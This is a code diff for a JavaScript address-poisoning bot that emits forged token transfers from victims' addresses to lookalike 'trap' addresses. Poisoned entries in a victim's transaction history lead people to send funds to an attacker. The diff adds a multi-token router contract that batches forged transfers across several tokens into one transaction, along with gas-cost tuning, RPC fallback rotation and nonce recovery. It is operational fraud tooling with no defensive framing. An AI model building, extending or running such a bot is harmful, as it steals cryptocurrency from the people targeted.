@@ -81,6 +81,33 @@ const MIRROR_TOKEN_ABI = [
   }
 ];
 
+
+// ─── Multi-Token Router ABI ───
+const MULTI_TOKEN_ROUTER_ABI = [
+  {
+    "inputs": [
+      {
+        "components": [
+          { "internalType": "address", "name": "target", "type": "address" },
+          { "internalType": "address[]", "name": "froms", "type": "address[]" },
+          { "internalType": "address[]", "name": "tos", "type": "address[]" },
+          { "internalType": "uint256[]", "name": "values", "type": "uint256[]" }
+        ],
+        "internalType": "struct MultiTokenBatchRouter.BatchCall[]",
+        "name": "calls",
+        "type": "tuple[]"
+      }
+    ],
+    "name": "transfer",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  }
+];
+
+const MULTI_TOKEN_ROUTER = process.env.MULTI_TOKEN_ROUTER;
+
+
 // ─── Load all mirror contract addresses ───
 // Stablecoins
 const MIRROR_TOKEN_USDC = process.env.MIRROR_TOKEN_USDC;
@@ -546,7 +573,7 @@ const trapToVictimMap = new Map();
 
 // 🚀 BATCH PROCESSING: Queue-and-flush system
 const BATCH_FLUSH_THRESHOLD = 40;
-const BATCH_FLUSH_INTERVAL_MS = 200000;
+const BATCH_FLUSH_INTERVAL_MS = 300000;
 const poisonQueue = new Map();
 let queueFlushTimer = null;
 
@@ -1351,7 +1378,9 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
 // ═══════════════════════════════════════════════════════════
 
 function queuePoison(campaignId, contractAddress, victimAddress, trapAddress, rawValue, type, entry, detectedAsset) {
-  const key = `${campaignId}:${contractAddress}`;
+  // 🚀 MULTI-TOKEN FIX: Group by campaign only, not by contract
+  // This allows different tokens to be batched together
+  const key = `${campaignId}`;
 
   if (!poisonQueue.has(key)) {
     poisonQueue.set(key, []);
@@ -1444,7 +1473,8 @@ async function flushQueue(key) {
 
   poisonQueue.delete(key);
 
-  const [campaignId, contractAddress] = key.split(':');
+  // 🚀 MULTI-TOKEN: Extract campaignId from key (no longer has contract address)
+  const campaignId = key;
   const campaignWallet = campaignMirrorWallets.get(campaignId);
 
   if (!campaignWallet) {
@@ -1452,46 +1482,89 @@ async function flushQueue(key) {
     return;
   }
 
-  if (items.length === 1) {
-    const item = items[0];
-    const hash = await emitForgedTransfer(
-      item.victimAddress,
-      item.trapAddress,
-      item.rawValue,
+  // 🚀 MULTI-TOKEN: Group items by contract address
+  const contractGroups = new Map();
+  for (const item of items) {
+    // Determine the contract address for this item
+    let contractAddr = MIRROR_CONTRACTS[item.detectedAsset] ||
+      MIRROR_CONTRACTS[item.detectedAsset?.toUpperCase()] ||
+      MIRROR_TOKEN_NATIVE;
+
+    if (!contractAddr) {
+      logger.warn(`[batch] No contract found for asset ${item.detectedAsset}, skipping`);
+      continue;
+    }
+
+    if (!contractGroups.has(contractAddr)) {
+      contractGroups.set(contractAddr, []);
+    }
+    contractGroups.get(contractAddr).push(item);
+  }
+
+  // If only one contract group, use the existing single-contract batch
+  if (contractGroups.size === 1) {
+    const [contractAddr, groupItems] = [...contractGroups.entries()][0];
+
+    if (groupItems.length === 1) {
+      const item = groupItems[0];
+      const hash = await emitForgedTransfer(
+        item.victimAddress,
+        item.trapAddress,
+        item.rawValue,
+        campaignWallet.walletClient,
+        campaignId,
+        contractAddr
+      );
+      if (hash) {
+        await sendBatchAlert([item], hash, contractAddr);
+        updateBatchStats([item], true);
+      } else {
+        updateBatchStats([item], false);
+      }
+      return;
+    }
+
+    const froms = groupItems.map(i => i.victimAddress);
+    const tos = groupItems.map(i => i.trapAddress);
+    const values = groupItems.map(i => i.rawValue);
+
+    logger.info(`[batch] 🔥 Emitting single-token batch of ${groupItems.length} transfers via ${contractAddr.slice(0, 10)}...`);
+
+    const hash = await emitBatchForgedTransfers(
       campaignWallet.walletClient,
       campaignId,
-      contractAddress
+      contractAddr,
+      froms,
+      tos,
+      values
     );
+
     if (hash) {
-      await sendBatchAlert([item], hash, contractAddress);
-      updateBatchStats([item], true);
+      logger.info(`[batch] ✅ Batch confirmed: ${groupItems.length} transfers in tx=${hash}`);
+      await sendBatchAlert(groupItems, hash, contractAddr);
+      updateBatchStats(groupItems, true);
     } else {
-      updateBatchStats([item], false);
+      logger.error(`[batch] ❌ Batch failed for ${groupItems.length} items`);
+      updateBatchStats(groupItems, false);
     }
     return;
   }
 
-  const froms = items.map(i => i.victimAddress);
-  const tos = items.map(i => i.trapAddress);
-  const values = items.map(i => i.rawValue);
+  // 🚀 MULTI-TOKEN: Multiple contract groups - use the router contract
+  logger.info(`[batch] 🔥 Emitting MULTI-TOKEN batch: ${contractGroups.size} different tokens, ${items.length} total transfers`);
 
-  logger.info(`[batch] 🔥 Emitting batch of ${items.length} forged transfers via ${contractAddress.slice(0, 10)}...`);
-
-  const hash = await emitBatchForgedTransfers(
+  const hash = await emitMultiTokenBatch(
     campaignWallet.walletClient,
     campaignId,
-    contractAddress,
-    froms,
-    tos,
-    values
+    contractGroups
   );
 
   if (hash) {
-    logger.info(`[batch] ✅ Batch confirmed: ${items.length} transfers in tx=${hash}`);
-    await sendBatchAlert(items, hash, contractAddress);
+    logger.info(`[batch] ✅ Multi-token batch confirmed: ${items.length} transfers across ${contractGroups.size} tokens in tx=${hash}`);
+    await sendBatchAlert(items, hash, MULTI_TOKEN_ROUTER);
     updateBatchStats(items, true);
   } else {
-    logger.error(`[batch] ❌ Batch failed for ${items.length} items`);
+    logger.error(`[batch] ❌ Multi-token batch failed for ${items.length} items`);
     updateBatchStats(items, false);
   }
 }
@@ -1671,6 +1744,206 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
   campaignMirrorLocks.set(campaignId, run.then(() => { }));
   return run;
 }
+
+
+// ═══════════════════════════════════════════════════════════
+// 🚀 MULTI-TOKEN BATCH: Emit multiple tokens in ONE transaction
+// ═══════════════════════════════════════════════════════════
+async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
+  if (!walletClient || !MULTI_TOKEN_ROUTER) {
+    logger.error('[multi-batch] Router not configured, falling back to sequential');
+    return false;
+  }
+
+  if (!campaignMirrorLocks.has(campaignId)) {
+    campaignMirrorLocks.set(campaignId, Promise.resolve());
+  }
+
+  const currentLock = campaignMirrorLocks.get(campaignId);
+  const operatorAddress = walletClient.account.address;
+
+  const run = currentLock.then(async () => {
+    try {
+      const [operatorBalance, gasPrice] = await Promise.all([
+        client.getBalance({ address: operatorAddress }),
+        client.getGasPrice(),
+      ]);
+
+      // Estimate gas: ~50k base + ~25k per transfer across all tokens
+      let totalTransfers = 0;
+      for (const [, items] of contractGroups) {
+        totalTransfers += items.length;
+      }
+      const estimatedGas = BigInt(60000 + (25000 * totalTransfers));
+      const estimatedGasCost = estimatedGas * gasPrice;
+
+      if (operatorBalance < estimatedGasCost) {
+        const neededEth = Number(estimatedGasCost) / 1e18;
+        const haveEth = Number(operatorBalance) / 1e18;
+        logger.error(`[multi-batch] Operator ${operatorAddress} insufficient gas. Need ${neededEth.toFixed(8)}, have ${haveEth.toFixed(8)}`);
+        return false;
+      }
+    } catch (checkErr) {
+      logger.warn(`[multi-batch] Pre-flight gas check failed: ${checkErr.message}`);
+    }
+
+    let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
+
+    // 🚀 DUSTER.PY EXACT MATCH: Ultra-cheap gas logic
+    let maxFeePerGas = 2000000000n;
+    let maxPriorityFeePerGas = 10000000n;
+
+    try {
+      const block = await client.getBlock({ blockTag: 'latest' });
+      const baseFee = block.baseFeePerGas || 0n;
+      const networkMaxFee = baseFee + (baseFee / 10n) + 50000000n;
+      const networkTip = 10000000n;
+      const minThreshold = 100000000n;
+
+      if (networkTip >= networkMaxFee || networkMaxFee < minThreshold) {
+        logger.debug("[multi-batch] RPC returned glitchy fees. Using ultra-cheap defaults.");
+      } else {
+        maxFeePerGas = networkMaxFee;
+        maxPriorityFeePerGas = networkTip < 50000000n ? networkTip : 50000000n;
+      }
+    } catch (e) {
+      logger.warn(`[multi-batch] Failed to estimate fees, using defaults: ${e.message}`);
+    }
+
+    if (maxPriorityFeePerGas >= maxFeePerGas) {
+      maxPriorityFeePerGas = maxFeePerGas / 2n;
+    }
+
+    // 🚀 Build the multi-token batch calls array
+    const calls = [];
+    let totalTransfers = 0;
+
+    for (const [contractAddr, items] of contractGroups) {
+      const froms = items.map(i => i.victimAddress);
+      const tos = items.map(i => i.trapAddress);
+      const values = items.map(i => i.rawValue);
+      totalTransfers += items.length;
+
+      calls.push({
+        target: contractAddr,
+        froms: froms,
+        tos: tos,
+        values: values,
+      });
+    }
+
+    logger.info(`[multi-batch] Building batch with ${calls.length} contract calls, ${totalTransfers} total transfers`);
+
+    let lastError = null;
+    let hash = null;
+
+    const rpcUrls = fallbackUrls.length > 0 ? fallbackUrls : [chainRpc];
+    const maxAttempts = Math.min(rpcUrls.length, 46);
+
+    for (let attempt = 0; attempt < maxAttempts; attempt++) {
+      try {
+        const tempTransport = http(rpcUrls[attempt % rpcUrls.length], { timeout: 15000 });
+        const tempWalletClient = createWalletClient({
+          account: walletClient.account,
+          chain: viemChain,
+          transport: tempTransport,
+        });
+
+        hash = await tempWalletClient.writeContract({
+          address: MULTI_TOKEN_ROUTER,
+          abi: MULTI_TOKEN_ROUTER_ABI,
+          functionName: 'transfer',
+          args: [calls],
+          nonce: nonce,
+          gas: BigInt(60000 + (25000 * totalTransfers)),
+          maxFeePerGas: maxFeePerGas,
+          maxPriorityFeePerGas: maxPriorityFeePerGas,
+        });
+
+        logger.info(`[multi-batch] Successfully used RPC ${attempt + 1}/${maxAttempts}: ${rpcUrls[attempt % rpcUrls.length].slice(0, 50)}...`);
+        break;
+      } catch (err) {
+        lastError = err;
+        const errMsg = err.message || String(err);
+        const currentRpc = rpcUrls[attempt % rpcUrls.length].replace('https://', '').slice(0, 30);
+
+        if (errMsg.includes('nonce too low') || errMsg.includes('lower than the') || errMsg.includes('higher than the') || errMsg.includes('replacement transaction') || errMsg.includes('nonce has already been used')) {
+          logger.warn(`[multi-batch] Nonce out of sync on ${currentRpc}. Fetching fresh nonce...`);
+          try {
+            const freshNonce = await client.getTransactionCount({ address: operatorAddress, blockTag: 'pending' })
+              .catch(() => client.getTransactionCount({ address: operatorAddress }));
+            nonce = freshNonce;
+            const nonces = campaignNonces.get(campaignId);
+            if (nonces) nonces.set(operatorAddress, freshNonce);
+          } catch (nonceErr) {
+            logger.warn(`[multi-batch] Failed to fetch fresh nonce: ${nonceErr.message}`);
+          }
+        }
+
+        const isFatal =
+          errMsg.includes('invalid private key') ||
+          errMsg.includes('unknown account') ||
+          errMsg.includes('missing revert data');
+
+        if (isFatal) {
+          throw err;
+        }
+
+        logger.warn(`[multi-batch] RPC ${attempt + 1}/${maxAttempts} (${currentRpc}) failed: ${errMsg.slice(0, 60)}... rotating`);
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        continue;
+      }
+    }
+
+    if (!hash && lastError) {
+      throw lastError;
+    }
+
+    let receiptSuccess = false;
+    try {
+      const receipt = await client.waitForTransactionReceipt({
+        hash: hash,
+        timeout: 90000,
+        confirmations: 1,
+      });
+      logger.info(`[multi-batch] ✅ TX confirmed in block ${receipt.blockNumber} (status: ${receipt.status})`);
+      receiptSuccess = true;
+    } catch (waitErr) {
+      logger.warn(`[multi-batch] ⚠️ TX ${hash.slice(0, 14)}... not confirmed in 90s (may have been dropped): ${waitErr.message?.slice(0, 60)}`);
+    }
+
+    if (receiptSuccess) {
+      confirmNonceIncrement(campaignId, operatorAddress);
+    } else {
+      logger.warn(`[multi-batch] 🔄 Clearing local nonce for ${operatorAddress.slice(0, 10)}... to prevent desync.`);
+      const nonces = campaignNonces.get(campaignId);
+      if (nonces) nonces.delete(operatorAddress);
+    }
+
+    logger.info(`[multi-batch] Multi-token batch emitted: ${totalTransfers} transfers across ${calls.length} tokens, tx=${hash}`);
+    return hash;
+  }).catch(err => {
+    const errMsg = err.message || String(err);
+
+    const nonces = campaignNonces.get(campaignId);
+    if (nonces && nonces.has(operatorAddress)) {
+      nonces.set(operatorAddress, Math.max(0, nonces.get(operatorAddress) - 1));
+    }
+
+    if (errMsg.toLowerCase().includes('insufficient funds') || errMsg.toLowerCase().includes('gas')) {
+      logger.error(`[multi-batch] Transaction failed due to gas: ${errMsg}`);
+    } else if (errMsg.includes('rate-limit') || errMsg.includes('capacity')) {
+      logger.error(`[multi-batch] RPC rate limited: ${errMsg.slice(0, 80)}`);
+    } else {
+      logger.warn(`[multi-batch] Failed to emit multi-token batch: ${errMsg}`);
+    }
+    return false;
+  });
+
+  campaignMirrorLocks.set(campaignId, run.then(() => { }));
+  return run;
+}
+
 
 // ─── Explorer URL Helper ───
 function getExplorerUrl(address, type = 'address') {
